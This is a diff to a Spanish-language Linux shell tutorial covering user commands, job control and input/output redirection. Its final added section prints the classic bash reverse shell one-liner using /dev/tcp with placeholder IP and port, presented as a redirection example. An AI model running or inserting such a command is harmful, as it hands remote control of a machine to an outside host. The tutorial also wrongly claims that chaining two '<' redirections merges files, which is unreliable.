@@ -228,6 +228,14 @@ pkill patron
 Basicamente es la version de pgrep que mata procesos en lugar de buscarlos.
 
 ### Gestion de usuarios
+#### WHOAMI y ID
+Se ejecutan por su nombre y muestran informacion del usuario que lo ejecuta.
+
+- whoami muestra basicamente que usuario eres.
+- id muestra uid y grupos
+
+A id le puedes especificar otro usuario.
+
 #### SU
 Se ejecuta de la siguiente manera:
 ```shell
@@ -326,13 +334,20 @@ groupdel grupo
 
 Añaden y eliminan grupos del sistema respectivamente.
 
-#### NEWGROUP
+#### NEWGRP
 Se ejecuta de la siguiente manera:
 ```shell
-newgroup grupo
+newgrp grupo
 ```
 
 Permite a un usuario moverse temporalmente a un grupo.
+
+Si el grupo no tiene contraseña, como cualquier usuario menos root, te pedira que introduzcas una contraseña.
+
+Esto se puede establecer con:
+```shell
+gpasswd grupo
+```
 
 ## Gestion del flujo y Redireccion de datos
 Controlar el flujo de los procesos, su input y output, y la comunicacion entre ellos y la automatizacion de todo esto es lo que puede hacer mucho mas eficaz y eficiente nuestra experiencia dentro de una shell.
@@ -402,7 +417,8 @@ Sirve para continuar en segundo plano un proceso suspendido.
 *Ejemplo:*
 ```shell
 firefox
-(Ctrl+Z) (la ventana de firefox deberia ser inutil)bg (deberia volver a funcionar ahora)
+(Ctrl+Z) (la ventana de firefox deberia ser inutil)
+bg (deberia volver a funcionar ahora)
 ```
 
 #### PIPES
@@ -417,4 +433,98 @@ comando2 | comando2
 Es muy util con los comandos de filtrado, busqueda y ordenamiento que vamos a ver mas adelante.
 
 ### Redireccion de Datos
+#### Entrada Estandard (stdin)
+Podemos indicar una entrada de input desde un fichero de la siguiente manera:
+```shell
+comando < entrada.txt
+```
+
+De esta forma, podemos pasarle a un script el contenido de un fichero.
+
+Aunque muchos comandos aceptan directamente el nombre de archivo como argumento, esto es muy util para scripts, o para combinar varios archivos en un solo input:
+```shell
+cat archivo1.txt archivo2.txt | comando
+```
+Se podria hacer de la siguiente manera sin llamar a cat:
+```shell
+comando < archivo1.txt < archivo2.txt
+```
+
+Tambien es util con algunos dispositivos que veremos mas adelante.
+
+A parte, tambien con << le puedes indicar un caracter o string de fin de archivo e introducir el input directamente desde terminal:
+*Por ejemplo:*
+```shell
+comando << EOF
+```
+
+Esto leera tu input hasta que introduzacas EOF y lo tratara como un archivo
+
+#### Salida Estandard (stdout)
+Podemos redirigir la salida estandard de un comando de la siguiente manera:
+```shell
+comando >  salida.txt
+```
+
+Esto sobreescribe el fichero con la salida del comando ejecutado.
+
+Si quieres añadirlo al final en lugar de sobre escribirlo puedes:
+```shell
+comando >> salida.txt
+```
+
+#### Salida de Error (stderr)
+Se puede redirigir la salida de error de la siguiente manera:
+```shell
+comando 2> salida.txt
+```
+Y para añadir al final:
+```shell
+comando 2>> salida.txt
+```
+#### Combinar las Salidas
+Se puede representar de varias formas. La mas sencilla:
+```shell
+comando &> salida.txt
+```
+
+Esto es lo mismo que:
+```shell
+comando > salida.txt 2>&1
+```
+
+Tambien se puede añadir al final como siempre, duplicando los >>. Tambien funciona como >&.
+
+#### Entender las redirecciones compejas
+Existen 3 descriptores de fichero por defecto:
+- 0 : Entrada estandard (stdin)
+- 1 : Salida estandard (stdout)
+- 2 : Salida de error (stderr)
+
+Cuando te encuentras redirecciones de tipo: N>&M,  lo que esta es redirigiendo la salida N al mismo lugar que la salida M, como puedes ver en el ejemplo de Combinar las Salidas.
+
+
+Tambien se pueden crear descriptores de ficheros propios para redirecciones mas complejas.
+
+#### Dispositivos especiales
+Hay ciertos dispositivos especiales que otorgan funcionamientos especificos de cara a la redireccion.
+
+- /dev/null :la "basura", es una forma util de eliminar cierta parte del output o callar comandos (&> /dev/null)
+- /dev/tcp/ip/puerto : representa una conexion tcp hacia fuera con el peurto y la ip especificadas
+- /dev/udp/ip/puerto : representa una conexion udp hacia fuera con el puerto y la ip especificadas
+- /dev/stdout , /dev/stdin, /dev/stderr : las representaciones literales de la salida y entrada.
+- /dev/fd/N : si N es un int valido, representa los descriptores de fichero propios.
+
+#### Redireccion de Reverse Shell
+Para poner un ejemplo real, la tipica reverse Shell de bash:
+```shell
+bash -i >& /dev/tcp/ip/puerto 0>&1
+```
+Entonces:
+- bash -i: : Inicia una instancia interactiva de bash.
+- >& /dev/tcp/ip/puerto : envia la salida de error y estandard por la conexion TCP
+- redirige la entrada estandard hacia el mismo destino que la salida estandard.
+
+En resumen estamos enviando todas las entradas y salidas por el dispositivo /dev/tcp/ip
+
 
